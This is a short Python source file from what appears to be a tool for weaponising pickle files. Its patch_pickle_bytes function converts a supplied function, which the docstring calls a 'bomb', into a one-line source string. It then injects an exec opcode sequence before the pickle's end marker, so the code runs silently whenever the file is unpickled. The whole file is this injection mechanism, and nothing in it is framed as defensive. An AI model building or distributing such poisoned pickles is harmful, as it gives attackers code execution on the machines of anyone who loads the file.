import inspect
import pickletools
from types import FunctionType

from utils.encoding import _exec_code_op


def patch_pickle_bytes(payload: bytes, f: FunctionType, optimize=False, encode=True):
    """Patch pickle payload to execute f after unpickling
    :param payload: pickled object
    :param f: bomb to call
    :param optimize: optimize pickle payload
    :param encode: encode source code in bytestream
    """
    if payload[-1:].decode() != ".":
        raise ValueError("unkonwn pickle format")
    source_line = make_source_from_function(f)
    # if len(source_line.split("\n")) > 1:
    #    raise ValueError("source must be a one-liner")
    injection = _exec_code_op(source_line, encode)
    payload = payload[:-1] + injection + b"0."
    if optimize:
        payload = pickletools.optimize(payload)
    return payload


def make_source_from_function(f):
    # Convert function into executable oneliner
    if hasattr(f, "_source"):
        lines = getattr(f, "_source").splitlines()
        lines = [l + "\n" for l in lines]
    else:
        lines = inspect.getsourcelines(f)[0]

    lines_1 = [l[4:] for l in lines]
    ans = "".join(lines_1[1:]) #.replace('"', "\"")

    try:
        hexlen = bytes([len(ans)])
        return ans
    except:
        return ans[:-1] + ';'